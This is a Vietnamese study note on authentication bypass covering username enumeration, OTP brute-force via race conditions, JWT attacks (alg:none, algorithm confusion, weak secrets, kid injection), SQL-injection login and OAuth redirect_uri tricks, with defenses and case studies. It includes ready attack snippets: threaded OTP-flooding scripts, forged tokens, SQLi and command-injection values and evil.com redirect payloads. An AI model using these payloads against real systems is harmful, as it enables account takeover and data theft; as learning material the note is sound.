---
title: "lys thuyet authentication"
---


# I)
Để có cái nhìn đầy đủ và chuyên sâu về Authentication và Authentication Bypass, chúng ta sẽ cùng đi qua từng lớp của vấn đề: từ các khái niệm nền tảng, các lỗ hổng phổ biến, cho đến những kỹ thuật bypass tinh vi nhất và cách phòng chống.

###  1. Nền tảng về Authentication và Authorization

*   **Authentication (Xác thực)**: Là quá trình xác minh danh tính của một người dùng. Ví dụ: nhập username và password để chứng minh bạn là ai.
*   **Authorization (Ủy quyền)**: Là quá trình xác định quyền hạn của người dùng sau khi đã được xác thực. Ví dụ: sau khi đăng nhập, bạn có quyền truy cập trang `/profile` hay không.
*   **Mối quan hệ**: Authentication luôn diễn ra trước Authorization. Bạn không thể cấp quyền cho một người mà bạn chưa biết họ là ai.

Các cơ chế xác thực phổ biến bao gồm: ==xác thực dựa trên mật khẩu, xác thực đa yếu tố (MFA), OAuth, SAML, JWT, và các token khác.==

###  2. Các lỗ hổng xác thực phổ biến (Vulnerabilities)

Lỗ hổng xác thực thường rơi vào hai nhóm chính: **cơ chế yếu, dễ bị brute-force** và **lỗi logic cho phép bypass toàn bộ quy trình**. Các chức năng phụ trợ như "quên mật khẩu", "ghi nhớ đăng nhập" thường kém an toàn hơn form đăng nhập chính và là mục tiêu tấn công ưu tiên.

#### 2.1. Tấn công vào Đăng nhập bằng Mật khẩu

*   **Liệt kê người dùng (==Username Enumeration)**==: Kẻ tấn công xác định các username hợp lệ bằng cách quan sát sự khác biệt trong phản hồi của server.
    *   **Qua thông báo lỗi**: `Invalid username or password` (sai cả hai) so với `Incorrect password` (chỉ sai mật khẩu).
    *   **Qua mã trạng thái**: `302` (chuyển hướng) cho username hợp lệ và `200` cho username không hợp lệ.
    *   **Qua thời gian phản hồi**: Server mất nhiều thời gian hơn để xử lý username hợp lệ vì phải thực hiện thêm bước hash mật khẩu.
*   **Bypass Bảo vệ Brute-Force**: ==Các kỹ thuật vượt qua rate-limiting== hoặc IP block.
    *   **Giả mạo IP**: Nhiều ứng dụng tin tưởng header `X-Forwarded-For`. ==Kẻ tấn công có thể thay đổi giá trị này sau mỗi request để giả mạo một IP mới, vượt qua giới hạn.==
    *   **Reset bộ đếm**: Nếu bộ đếm số lần đăng nhập sai bị reset sau một lần đăng nhập đúng, kẻ tấn công có thể chèn một cặp `username:password` hợp lệ vào danh sách brute-force để reset bộ đếm.
    *   **Gửi nhiều mật khẩu trong một request**: ==Một số API có thể chấp nhận một mảng các mật khẩu trong trường `password` của JSON body,== cho phép thử nhiều khả năng chỉ trong một request.

#### 2.2. Tấn công vào Xác thực Đa yếu tố (MFA/2FA)

* **Bypass Logic (Bỏ qua bước)**: Sau khi xác thực lớp đầu tiên, ứng dụng chuyển hướng đến trang nhập mã 2FA. Kẻ tấn công có thể bỏ qua bước này bằng cách truy cập trực tiếp vào URL của trang đích (ví dụ: `/dashboard`).

> [!NOTE]
>  -> đại khái là đáng lẽ phải nhập đúng mã 2fa thì mới vaod được , nhưng logic sai, có thể trỏ tới thẳng /dashboard luôn

* **Thao túng Response (Client-side)**: Nếu việc ==xác minh OTP được thực hiện ở phía client,== kẻ tấn công có thể sửa response từ server để đánh lừa ứng dụng.
    *   **Ví dụ**: Server trả về `{"verified": false}`. Kẻ tấn công sửa thành `{"verified": true}` và gửi lại cho browser. Nếu ứng dụng tin tưởng vào giá trị này và cho phép truy cập, đó là một bypass.
    > => lỗi này thường chắc ko ai mắc phải cả
* **Brute-force OTP**: Mã OTP thường là dãy số ngắn (ví dụ: 4-6 chữ số). Nếu endpoint xác minh OTP không có rate-limiting, kẻ tấn công có thể thử toàn bộ không gian mã (từ 0000 đến 9999) để tìm ra mã đúng.
* **Tấn công Race Condition**: Lỗi logic trong quá trình xác minh có thể cho phép kẻ tấn công gửi nhiều request đồng thời để thực hiện nhiều hành động (ví dụ: kích hoạt 2FA, reset mật khẩu) trước khi trạng thái được cập nhật.

> [!example]
> # Ví dụ về Race Condition trong Authentication
> 
> ## 1. Kịch bản: Đăng ký tài khoản với username trùng
> 
> **Logic ứng dụng (có lỗi):**
> ```python
> def register(username, password):
>     # Bước 1: Kiểm tra username tồn tại chưa
>     if User.query.filter_by(username=username).first():
>         return "Username đã tồn tại"
>     
>     # Bước 2: Tạo user mới
>     user = User(username=username, password=password)
>     db.session.add(user)
>     db.session.commit()
>     return "Đăng ký thành công"
> ```
> 
> **Lỗi:** Giữa bước 1 và bước 2 có **khoảng trễ**. Nếu attacker gửi 2 request cùng lúc với cùng username:
> - Request A: check → chưa tồn tại → tiếp tục
> - Request B: check → chưa tồn tại → tiếp tục
> - Cả hai cùng tạo user → **2 user cùng username**
> 
> **Khai thác:**
> ```python
> import threading, requests
> 
> def register():
>     requests.post("https://target.com/register", 
>                   data={"username": "admin", "password": "hacked"})
> 
> # Gửi 50 request đồng thời
> threads = [threading.Thread(target=register) for _ in range(50)]
> for t in threads: t.start()
> for t in threads: t.join()
> ```
> 
> → ==Tạo được nhiều tài khoản `admin` cùng lúc,== có thể dùng để takeover hoặc gây lỗi logic.
> 
> ---
> 
> ## 2. Kịch bản: Brute-force 2FA vượt rate limit
> 
> **Logic ứng dụng (có lỗi):**
> ```python
> def verify_otp(user_id, otp):
>     attempts = get_attempts(user_id)
>     if attempts >= 5:
>         return "Quá nhiều lần thử"
>     
>     if otp == get_otp(user_id):
>         return "Thành công"
>     else:
>         increment_attempts(user_id)  # ← Tăng SAU khi kiểm tra
>         return "Sai OTP"
> ```
>
> **Lỗi:** Bộ đếm được tăng **sau** khi kiểm tra, nên có khoảng trễ nhỏ.
> 
> **Khai thác:** Gửi 100 request đồng thời, mỗi request thử 1 OTP khác nhau. Tất cả cùng đọc `attempts = 0` → tất cả đều được phép thử → brute-force toàn bộ không gian OTP.
>==**=> cái này rất hay nha, có thể bypass cơ chế otp nếu dev code ẩu**== 
> ```python
> import threading, requests
> 
> def try_otp(otp):
>     requests.post("https://target.com/verify-2fa",
>                   data={"otp": otp},
>                   cookies={"session": "victim_session"})
> 
> # Thử 1000 OTP cùng lúc
> for otp in range(1000):
>     threading.Thread(target=try_otp, args=(f"{otp:04d}",)).start()
> ```
> 
> → Vượt qua rate limit → tìm ra OTP đúng.
> 
> ---
> 
> ## 3. Kịch bản: Dùng coupon nhiều lần
> 
> **Logic ứng dụng (có lỗi):**
> ```php
> $coupon = getCoupon($_POST['code']);
> if ($coupon->used == false) {
>     applyDiscount($coupon);
>     $coupon->used = true;
>     $coupon->save();
> }
> ```
> 
> **Lỗi:** Giữa `check` và `update` có khoảng trễ.
> 
> **Khai thác:** Gửi 10 request áp coupon cùng lúc → cả 10 đều thấy `used = false` → áp dụng 10 lần giảm giá.
> 
> ---
> 
> ## 4. Kịch bản: Rút tiền từ 2 nơi cùng lúc
> 
> **Logic ngân hàng (có lỗi):**
> ```python
> def withdraw(user_id, amount):
>     balance = get_balance(user_id)
>     if balance >= amount:
>         new_balance = balance - amount
>         set_balance(user_id, new_balance)
>         return "Thành công"
>     return "Số dư không đủ"
> ```
> 
> **Khai thác:** Số dư = 1000. Gửi 2 request rút 1000 cùng lúc:
> - Request A: đọc balance = 1000 → đủ → trừ 1000 → còn 0
> - Request B: đọc balance = 1000 (trước khi A cập nhật) → đủ → trừ 1000 → còn -1000
> 
> → Rút được 2000 từ tài khoản có 1000.
> 
> ---
> 
> ## 5. Cách phòng chống
> 
> | Biện pháp | Mô tả |
> |-----------|-------|
> | **Database lock** | Dùng `SELECT ... FOR UPDATE` để lock row khi đọc/ghi |
> | **Atomic operation** | Dùng `UPDATE ... WHERE balance >= amount` trong 1 query |
> | **Transaction** | Bọc toàn bộ logic trong transaction với isolation level phù hợp |
> | **Unique constraint** | Đặt UNIQUE constraint trên username để DB tự chặn trùng |
> | **Mutex/Lock** | Dùng distributed lock (Redis, mutex) cho hành động nhạy cảm |
> | **Idempotency key** | Yêu cầu client gửi key duy nhất, server chỉ xử lý 1 lần |
> 
> **Ví dụ dùng atomic update:**
> ```sql
> UPDATE users SET balance = balance - 1000 
> WHERE id = 1 AND balance >= 1000;
> -- Nếu affected rows = 0 → số dư không đủ
> ```
> 
> ---
> 
> ## 6. Công cụ test Race Condition
> 
> - **Burp Suite Turbo Intruder**: Gửi hàng ngàn request đồng thời với độ chính xác cao.
> - **Python `threading` / `asyncio`**: Tự viết script gửi song song.
> - **Raceocat**: Công cụ chuyên dụng của PortSwigger cho race condition.
> 
> **Ví dụ Burp Turbo Intruder:**
> ```python
> def queueRequests(target, wordlists):
>     engine = RequestEngine(endpoint=target.endpoint,
>                            concurrentConnections=30,
>                            requestsPerConnection=100,
>                            pipeline=True)
>     for i in range(30):
>         engine.queue(target.req, gate='race1')
>     engine.openGate('race1')
> 
> def handleResponse(req, interesting):
>     table.add(req)
> ```
> 
> ---
> 
> **Tóm gọn:** ==Race condition xảy ra khi logic có bước **check** và **update** tách rời, không atomic. Attacker gửi nhiều request đồng thời để tất cả cùng vượt qua bước check trước khi bước update hoàn tất. Phòng chống bằng **lock, atomic operation, transaction, unique constraint, idempotency key**.==


* **Lạm dụng tính năng "Recovery"**: Các tính năng như "backup codes" hoặc "recovery flow" thường yếu hơn và có thể bị lạm dụng để vô hiệu hóa 2FA hoàn toàn.
* **Token Reuse**: Các token (OTP, session) được sử dụng lại có thể bị lợi dụng để xác thực mà không cần yếu tố thứ hai.

#### 2.3. Lỗ hổng trong các Cơ chế Xác thực khác
* **Cookie "Stay-Logged-In"**: Nếu c==ookie được tạo không an toàn==, ví dụ như `base64(username:md5(password))`, kẻ tấn công có thể giải mã, sửa đổi username (ví dụ: thành `admin`) và tạo lại cookie để bypass đăng nhập.
* **Chức năng Quên Mật khẩu**: Đây là một trong những chức năng có nhiều lỗ hổng nhất.
    *   **Token yếu/đoán được**: Token được tạo từ `md5(email)` hoặc các giá trị dễ đoán khác.
    *   **Token không hết hạn**: Token có thể được sử dụng lại vô thời hạn.
    *   **Host Header Poisoning**: Kẻ tấn công thao túng header `Host` để link reset trỏ đến domain của chúng, từ đó đánh cắp token hợp lệ của nạn nhân.
    * **Leak qua Referer**: Token trong URL của trang reset có thể bị rò rỉ qua header `Referer` khi trang tải các tài nguyên bên ngoài.

### 3. Các Kỹ thuật Bypass Xác thực Chuyên sâu
#### 3.1. SQL Injection trong Login

Kẻ tấn công chèn payload SQL vào các trường username/password để thay đổi logic của truy vấn xác thực.

*   **Ví dụ**: Nhập username là `admin' --`.
*   **Query gốc**: `SELECT * FROM users WHERE username='$user' AND password='$pass'`
*   **Query sau khi inject**: `SELECT * FROM users WHERE username='admin'--' AND password='anything'`
*   Phần `--` biến điều kiện kiểm tra password thành comment, cho phép đăng nhập thành công mà không cần mật khẩu đúng.

#### 3.2. JWT (JSON Web Token) Attacks

JWT là một chuẩn phổ biến để xác thực và trao đổi thông tin. Các lỗi cấu hình JWT thường dẫn đến bypass.

* ==**`alg: none`**:== Kẻ tấn công ==sửa header của JWT thành `{"alg":"none"}`==, xóa phần chữ ký. Nếu server không kiểm tra thuật toán và chấp nhận token này, quá trình xác thực bị vô hiệu hóa.
* **Algorithm Confusion (RS256 → HS256)**: Server sử dụng thuật toán bất đối xứng RS256 (có public/private key). ==Kẻ tấn công đổi `alg` thành HS256 (đối xứng)==, ==sau đó sử dụng **public key** của server làm **secret key** để ký token mớ==i. Nếu server không kiểm tra `alg` và tự động chọn thuật toán, nó sẽ xác minh token bằng public key, vốn đã bị lộ.
* **Weak Secret (Secret yếu)**: Nếu HMAC secret dùng để ký token quá yếu (ví dụ: `secret1`, `password`), kẻ tấn công có thể brute-force để tìm ra và tự ký token hợp lệ.
* **`kid` (Key ID) Injection**: Header `kid` trỏ đến một file trên hệ thống (ví dụ: `kid: ../../../../dev/null`). Kẻ tấn công có thể trỏ `kid` đến một file có nội dung đã biết và ký token bằng nội dung đó.

-Tìm hiểu về jwt
![[Pasted image 20261002155832.png]]
> [!NOTE]
> # Quy trình server xác minh JWT
> 
> ## Các bước
> 
> **Bước 1: Nhận token từ client**
> ```
> Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWxpY2UifQ.abc123
> ```
> 
> **Bước 2: Tách token thành 3 phần**
> ```
> header    = eyJhbGciOiJIUzI1NiJ9
> payload   = eyJ1c2VyIjoiYWxpY2UifQ
> signature = abc123
> ```
> 
> **Bước 3: Decode header và payload (Base64URL)**
> ```json
> Header:  {"alg":"HS256","typ":"JWT"}
> Payload: {"user":"alice","role":"user","exp":1735689600}
> ```
> 
> **Bước 4: Chọn thuật toán + secret key**
> - Server đọc `alg` từ header (hoặc tự quyết định — tùy cấu hình).
> - Lấy secret key tương ứng (từ config, database, file...).
> 
> **Bước 5: Ký lại phần header + payload**
> ```python
> expected_sig = HMACSHA256(
>     base64(header) + "." + base64(payload),
>     secret_key
> )
> ```
> 
> **Bước 6: So sánh chữ ký**
> ```
> if expected_sig == signature:
>     → Token hợp lệ
> else:
>     → Từ chối (401 Unauthorized)
> ```
> 
> **Bước 7: Kiểm tra claims**
> ```json
> {
>   "exp": 1735689600,    ← Token còn hạn không?
>   "iss": "auth.target.com",  ← Issuer có đúng không?
>   "aud": "api.target.com",   ← Audience có đúng không?
>   "nbf": 1735603200          ← Đã đến thời gian dùng chưa?
> }
> ```
> 
> **Bước 8: Cấp quyền truy cập**
> - Nếu tất cả hợp lệ → cho phép request.
> - Gắn thông tin user từ payload vào context.
> 
> ---
> 
> ## Sơ đồ tổng quát
> 
> ```
> Client gửi request + JWT
>         ↓
> Server tách 3 phần: header.payload.signature
>         ↓
> Decode header + payload (Base64)
>         ↓
> Đọc alg → chọn secret key tương ứng
>         ↓
> Ký lại header.payload bằng secret
>         ↓
> So sánh chữ ký
>         ↓

<div class="ascii-tree">

>     ┌───────────────┐
>     │ Khớp?         │
>     └───────┬───────┘

</div>

>          Không → 401 Unauthorized
>          Có ↓
>     Kiểm tra claims (exp, iss, aud, nbf)
>         ↓
>     Hợp lệ → Cấp quyền truy cập
> ```
> 
> ---
> 
> ## Điểm yếu thường bị khai thác
> 
> | Bước | Lỗi | Khai thác |
> |------|-----|-----------|
> | Bước 4 | Tin `alg` từ header | `alg: none`, RS256→HS256 |
> | Bước 5 | Secret yếu | Brute-force |
> | Bước 5 | `kid` không validate | Path traversal, SQLi |
> | Bước 7 | Không check `exp` | Token hết hạn vẫn dùng |
> | Bước 7 | Không check `iss`/`aud` | Token từ hệ thống khác dùng được |
>
> 
> ## Ví dụ code đúng (Node.js)
> 
> ```javascript
> const jwt = require('jsonwebtoken');
> 
> function verifyToken(token) {
>     try {
>         const decoded = jwt.verify(token, SECRET_KEY, {
>             algorithms: ['HS256'],   // ← Whitelist thuật toán
>             issuer: 'auth.target.com',
>             audience: 'api.target.com'
>         });
>         return decoded;
>     } catch (err) {
>         return null;  // Token không hợp lệ
>     }
> }
> ```
> 
> ## Ví dụ code sai (bị bypass)
> 
> ```javascript
> // SAI 1: Không whitelist thuật toán
> jwt.verify(token, SECRET_KEY);
> // → Chấp nhận alg:none nếu thư viện cũ
> 
> // SAI 2: Đọc alg từ token rồi mới chọn key
> const header = decode(token.split('.')[0]);
> const key = header.alg === 'HS256' ? hmacKey : publicKey;
> // → Algorithm confusion
> ```
> 
> 
> **Tóm gọn:** Server nhận JWT → tách 3 phần → decode header/payload → chọn secret theo thuật toán → ký lại → so sánh chữ ký → check claims (exp, iss, aud) → cấp quyền. Lỗi thường ở chỗ: **tin header `alg`**, **secret yếu**, **không validate `kid`**, hoặc **không check claims**.



-phần này giải thích về cấu trúc của jwt
> [!info]
> ## 1. "Bearer" là gì?
> 
> Là **từ khóa** trong HTTP header `Authorization` để báo cho server biết **loại token** đang được gửi.
> 
> text
> 
> Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
> 
> - `Bearer` = "người mang token này được phép truy cập".
>     
> - Ai có token → người đó được xác thực (giống như cầm thẻ ra vào).
>     
> 
> Các loại khác: `Basic` (username:password base64), `Digest`, `Bearer`.
> 
> ---
> 
> ## 2. Tại sao JWT nhìn giống JSON?
> 
> Vì **JWT được tạo từ JSON**. Cấu trúc JWT gồm 3 phần, mỗi phần là **JSON đã mã hóa Base64URL**:
> 
> text
> 
> eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWxpY2UifQ.abc123
>      ↑                      ↑                  ↑
>    Header                Payload           Signature
> 
> **Decode Base64 ra JSON:**
> 
> |Phần|JSON sau khi decode|
> |---|---|
> |Header|`{"alg":"HS256","typ":"JWT"}`|
> |Payload|`{"user":"alice","role":"user"}`|
> |Signature|(nhị phân, không phải JSON)|
> 
> → Vì vậy nhìn giống JSON. Base64 chỉ để **truyền an toàn qua URL/HTTP**, không phải mã hóa.
> 
> ---
> 
> ## 3. Ba phần làm gì?
> 
> ### Header — "Dùng thuật toán gì để ký?"
> 
> json
> 
> {
>   "alg": "HS256",    ← thuật toán ký (HS256, RS256, none...)
>   "typ": "JWT"       ← loại token
> }
> 
> ### Payload — "Chứa thông tin gì?"
> 
> json
> 
> {
>   "user": "alice",
>   "role": "user",
>   "exp": 1735689600   ← thời gian hết hạn
> }
> 
> Chứa **claims** — thông tin về user. Ai cũng **decode được** (Base64 không phải mã hóa), nên **không để dữ liệu nhạy cảm** ở đây.
> 
> ### Signature — "Token có bị sửa không?"
> 
> text
> 
> HMACSHA256(
>   base64(header) + "." + base64(payload),
>   secret_key
> )
> 
> - Server dùng **secret key** để ký lại.
>     
> - Nếu chữ ký khớp → token **không bị sửa**.
>     
> - Nếu attacker sửa payload → chữ ký không khớp → server từ chối.
>     
> 
> **Đây là lớp bảo vệ duy nhất** — nếu bypass được (alg:none, weak secret...) → attacker sửa payload tùy ý.



-phần này nói về các kỹ thuật tấn công jwt
> [!example]
> # Ví dụ từng kỹ thuật tấn công JWT
> 
> ## 1. `alg: none`
> 
> **JWT gốc:**
> ```
> Header:  {"alg":"HS256","typ":"JWT"}
> Payload: {"user":"alice","role":"user"}
> Signature: abc123...
> ```
> 
> **Attacker sửa thành:**
> ```
> Header:  {"alg":"none","typ":"JWT"}
> Payload: {"user":"alice","role":"admin"}     ← Đổi role
> Signature: (bỏ trống)
> ```
> 
> **Token mới:**
> ```
> eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoiYWRtaW4ifQ.
> ```
> 
> **Gửi request:**
> ```bash
> curl -H "Authorization: Bearer eyJhbGciOiJub25lIn0..." https://target.com/admin
> ```
> 
> **Nếu server chấp nhận** → attacker vào được admin.
> 
> **Cách làm với tool:**
> - Burp JWT Editor → chọn `none` algorithm → remove signature.
> 
> ## 2. Algorithm Confusion (RS256 → HS256)
> 
> **JWT gốc (RS256):**
> ```
> Header: {"alg":"RS256"}
> Payload: {"user":"alice"}
> Signature: (ký bằng private key của server)
> ```
> 
> **Server verify bằng public key** (lấy từ `/jwks.json`):
> ```json
> {
>   "keys": [{
>     "kty": "RSA",
>     "n": "0vx7agoebGcQ...",
>     "e": "AQAB"
>   }]
> }
> ```
> 
> **Attacker:**
> 1. Tải public key từ `/jwks.json`.
> 2. Sửa header thành `{"alg":"HS256"}`.
> 3. Ký token bằng **public key** (dùng làm HMAC secret).
> 
> ```python
> import jwt
> 
> public_key = open("public.pem").read()
> 
> token = jwt.encode(
>     {"user": "admin"},
>     public_key,           # ← Dùng public key làm HMAC secret
>     algorithm="HS256"
> )
> ```
> 
> **Gửi token** → server thấy `alg=HS256`, dùng public key để verify → **khớp** → attacker vào admin.
> 
> **Điều kiện:** ==Server tự động chọn algorithm dựa trên header `alg` mà không kiểm tra.==
> ## 3. Weak Secret
> 
> **JWT gốc (HS256):**
> ```
> Header: {"alg":"HS256"}
> Payload: {"user":"alice"}
> Signature: (ký bằng secret "secret1")
> ```
> 
> **Attacker brute-force secret:**
> ```bash
> hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
> ```
> 
> **Kết quả:**
> ```
> eyJhbGciOiJIUzI1NiJ9...:secret1
> ```
> 
> **Tạo token mới:**
> ```python
> import jwt
> token = jwt.encode({"user": "admin"}, "secret1", algorithm="HS256")
> ```
> 
> **Gửi token** → server verify bằng `secret1` → khớp → attacker vào admin.
> 
> **Tool:** `jwt_tool`, `hashcat -m 16500`.
> ## 4. `kid` (Key ID) Injection
> 
> **JWT gốc:**
> ```
> Header: {"alg":"HS256","kid":"key1"}
> Payload: {"user":"alice"}
> ```
> 
> **Server code:**
> ```python
> key_file = "/keys/" + header["kid"] + ".pem"
> secret = open(key_file).read()
> verify(token, secret)
> ```
> 
> **Attacker khai thác Path Traversal:**
> ```
> Header: {"alg":"HS256","kid":"../../../../dev/null"}
> ```
> 
> `/dev/null` là file rỗng → secret = chuỗi rỗng `""`.
> 
> **Ký token với secret rỗng:**
> ```python
> token = jwt.encode({"user": "admin"}, "", algorithm="HS256")
> ```
> 
> **Server đọc `/dev/null` → secret = "" → verify khớp** → attacker vào admin.
> 
> **Biến thể SQL Injection trong `kid`:**
> ```
> Header: {"kid":"key1' UNION SELECT 'mysecret'--"}
> ```
> → Server query DB lấy secret → trả về `mysecret` → attacker ký token với `mysecret`.
> 
> **Biến thể Command Injection trong `kid`:**
> ```
> Header: {"kid":"key1|id"}
> ```
> → Server chạy lệnh `id` → nếu không escape.
> ## Bảng tóm tắt
> 
> | Kỹ thuật | Sửa gì | Cần gì | Tool |
> |----------|--------|--------|------|
> | `alg: none` | Header `alg` = none, xóa signature | Server không check `alg` | Burp JWT Editor |
> | Algorithm Confusion | `alg` = HS256, ký bằng public key | Server tự chọn alg theo header | Python `jwt`, Burp |
> | Weak Secret | Không sửa, brute-force secret | Secret yếu | hashcat `-m 16500` |
> | `kid` Injection | Sửa `kid` thành path/SQL/command | Server dùng `kid` không validate | Burp, `jwt_tool` |
> 
> **Tóm gọn:** JWT bypass thường do server **tin tưởng header** (alg, kid) mà không kiểm tra. Luôn verify đúng algorithm, dùng secret mạnh, và validate `kid` (whitelist, không cho path traversal/SQLi).


-lý do mà tại sao các hệ thống lớn, lại dùng khóa bất đối xứng để verify jwt , mà lại ko dùng 1 secret key để ký 
![[Pasted image 20261002162009.png]]
     -> do với  public key, thì nhiều server sẽ có khả năng verify, và với 1 server có public key, thì sẽ chỉ có 1 server có khả năng cung cấp jwt cho người dùng, ví dụ là server cho /api/login
#### 3.3. OAuth 2.0 Vulnerabilities

* **`redirect_uri` Bypass**: OAuth server xác thực `redirect_uri` không chặt chẽ. Kẻ tấn công có thể thay đổi nó để authorization code hoặc access token được gửi đến domain của chúng.
* **Thiếu tham số `state` (CSRF)**: Tham số `state` được dùng để chống CSRF trong luồng OAuth. Nếu thiếu, kẻ tấn công có thể tạo một request ủy quyền và lừa nạn nhân hoàn tất nó, từ đó liên kết tài khoản của nạn nhân với tài khoản của kẻ tấn công.
* **Leak Token/Code**: Authorization code hoặc access token bị rò rỉ qua các kênh như Referer header hoặc open redirect.

> [!NOTE]
> # Ví dụ OAuth 2.0 Vulnerabilities
> 
> ## 1. `redirect_uri` Bypass
> 
> **Luồng bình thường:**
> ```
> https://oauth.com/authorize?client_id=app&redirect_uri=https://app.com/callback
> → OAuth server gửi code về https://app.com/callback
> ```
> 
> **Attacker sửa:**
> ```
> https://oauth.com/authorize?client_id=app&redirect_uri=https://evil.com
> → Code bị gửi về evil.com → attacker chiếm tài khoản
> ```
> 
> **Bypass whitelist:**
> ```
> redirect_uri=https://app.com.evil.com
> redirect_uri=https://app.com@evil.com
> redirect_uri=https://app.com/callback/../../evil
> ```
> 
> ---
> 
> ## 2. Thiếu `state` (CSRF)
> 
> **Luồng bình thường:**
> ```
> /authorize?...&state=random123
> → Callback phải có state=random123 mới hợp lệ
> ```
> 
> **Nếu thiếu `state`:**
> ```
> Bước 1: Attacker lấy authorization code của mình
>         /authorize?...&redirect_uri=https://app.com/callback
>         → code=ABC
> 
> Bước 2: Attacker gửi link cho victim:
>         https://app.com/callback?code=ABC
> 
> Bước 3: Victim click → app liên kết tài khoản victim
>         với tài khoản OAuth của attacker
> 
> Bước 4: Attacker login bằng OAuth → vào được tài khoản victim
> ```
> 
> ---
> 
> ## 3. Leak Token/Code qua Referer
> 
> **Kịch bản:** Trang callback chứa code trong URL, lại load tài nguyên từ domain ngoài.
> 
> ```
> https://app.com/callback?code=SECRET123
>         ↓
> Trang này load: <img src="https://analytics.com/track.js">
>         ↓
> Request gửi tới analytics.com kèm header:
> Referer: https://app.com/callback?code=SECRET123
>         ↓
> Attacker đọc log analytics.com → lấy code
> ```
> 
> **Bypass:** Dùng open redirect để đẩy code sang evil.com.
> 
> **Tóm gọn:**
> - `redirect_uri` bypass → code/token về evil.com.
> - Thiếu `state` → CSRF liên kết tài khoản.
> - Referer/open redirect → leak code/token.

#### 3.4. HTTP Verb Tampering
Một số ứng dụng chỉ kiểm tra quyền truy cập dựa trên HTTP method. Kẻ tấn công có thể thử thay đổi method (ví dụ: từ `GET` sang `POST` hoặc `PUT`) để vượt qua kiểm tra này.

#### 3.5. Bypass qua Header
Một số ứng dụng tin tưởng các header như `X-Original-URL`, `X-Rewrite-URL`, hoặc `X-Forwarded-For` để quyết định quyền truy cập. Kẻ tấn công có thể giả mạo các header này để truy cập các chức năng bị hạn chế.

###  4. Chiến lược Phòng chống Toàn diện

1.  **Xác thực mạnh mẽ**:
    *   Sử dụng thư viện xác thực uy tín, đã được kiểm chứng.
    *   Triển khai xác thực đa yếu tố (MFA) một cách đúng đắn, đảm bảo rằng tất cả các bước được kiểm tra ở phía server.
2.  **Bảo vệ chống Brute-Force**:
    *   Triển khai rate-limiting dựa trên IP và tài khoản.
    *   Sử dụng CAPTCHA sau một số lần thử thất bại.
    *   Không bao giờ tin tưởng header `X-Forwarded-For`.
3.  **Quản lý Session và Token an toàn**:
    *   Sử dụng session ID ngẫu nhiên, có độ entropy cao.
    *   Đặt cờ `HttpOnly`, `Secure`, và `SameSite` cho cookie.
    *   Vô hiệu hóa session ngay sau khi logout hoặc thay đổi mật khẩu.
    *   Với JWT: Luôn xác minh chữ ký, không bao giờ chấp nhận `alg: none`, sử dụng secret mạnh, và kiểm tra các claim như `iss`, `aud`, `exp`.
4.  **Bảo vệ các chức năng phụ trợ**:
    *   Token reset mật khẩu phải là ngẫu nhiên, có thời hạn, và được gắn với đúng người dùng.
    *   Sử dụng `state` parameter trong OAuth để chống CSRF.
    *   Kiểm tra và whitelist `redirect_uri` một cách nghiêm ngặt.
5.  **Kiểm tra Logic Nghiệp vụ**:
    *   Không bao giờ tin tưởng vào việc kiểm tra ở phía client. Mọi quyết định xác thực và ủy quyền phải được thực hiện ở server.
    *   Xem xét kỹ lưỡng các quy trình nhiều bước để đảm bảo không có bước nào có thể bị bỏ qua.
6.  **Phòng chống Injection**:
    *   Sử dụng prepared statements (parameterized queries) cho mọi truy vấn cơ sở dữ liệu để chống SQL Injection.
    *   Escape và validate mọi dữ liệu đầu vào từ người dùng.

Hy vọng bản tổng hợp này sẽ là một tài liệu tham khảo hữu ích cho bạn trong quá trình học tập và làm việc. Nếu bạn cần đi sâu hơn vào bất kỳ phần nào, hãy cho tôi biết nhé.

# Các case thực tế 

> [!NOTE]
> 
> ### 🔑 Case 1: JWT Signature Bypass — Microsoft Titan Analytics (2026)
> 
> Đây là một trong những case study điển hình nhất về lỗi xác thực JWT.
> 
> - **Lỗ hổng**: Microsoft Titan Analytics (nền tảng phân tích nội bộ) đã không xác minh chữ ký của JSON Web Token (JWT) mà chỉ kiểm tra các claim (tenant, audience, application ID) trong payload. Điều này có nghĩa là kẻ tấn công có thể thay đổi payload (ví dụ: đổi username thành `admin`) mà không cần chữ ký hợp lệ.
> - **Khai thác**: Nhà nghiên cứu bảo mật 16 tuổi (Faav) đã sử dụng một token không có chữ ký, thay đổi `User Principal Name` (UPN) thành `admin`. Hệ thống đã phân giải `admin` thành user ID 1 (tài khoản quản trị viên) và cho phép thực thi các truy vấn SQL trái phép.
> - **Hậu quả**: Kẻ tấn công có thể truy cập cơ sở dữ liệu metadata của Titan, bao gồm khoảng 25.000 tài khoản, 17.990 email nhân viên và ước tính 17,3 nghìn tỷ dòng dữ liệu tiềm năng.
> - **Bài học**: Chữ ký JWT là lớp bảo vệ quan trọng nhất. Luôn xác minh chữ ký trước khi tin tưởng bất kỳ claim nào trong payload.
> 
> ---
> 
> ### 🔑 Case 2: Password Reset Token Leak — Flowise (CVE-2025-58434)
> 
> - **Lỗ hổng**: API reset mật khẩu của Flowise (phiên bản trước 3.0.6) đã trả về `tempToken` hợp lệ trực tiếp trong response JSON khi kẻ tấn công gửi yêu cầu reset cho email của nạn nhân. Token này đáng lẽ phải được gửi qua email, không bao giờ được hiển thị trong response.
> - **Khai thác**: Kẻ tấn công không cần xác thực, chỉ cần gửi request đến endpoint reset với email mục tiêu, nhận token từ response và sử dụng nó để đặt lại mật khẩu, chiếm đoạt tài khoản hoàn toàn.
> - **Bài học**: Token reset mật khẩu phải được gửi qua kênh an toàn (email), không bao giờ xuất hiện trong response HTTP. Token cũng phải có thời hạn và gắn với đúng người dùng.
> 
> ---
> 
> ### 🔑 Case 3: OAuth Redirect URI Bypass — GitHub Enterprise Server (CVE-2026-4296)
> 
> - **Lỗ hổng**: GitHub Enterprise Server đã sử dụng một regular expression không chính xác để xác thực tham số `redirect_uri` trong luồng OAuth. Điều này cho phép kẻ tấn công (biết callback URL của một OAuth app first-party) tạo một liên kết xác thực độc hại và chuyển hướng authorization code hoặc token đến máy chủ do chúng kiểm soát.
> - **Khai thác**: Trong một bug bounty engagement năm 2025, nhà nghiên cứu đã thao túng `redirect_uri` và khiến ứng dụng rò rỉ toàn bộ JWT authentication token đến một Burp Collaborator server do họ kiểm soát, dẫn đến chiếm đoạt tài khoản hoàn toàn.
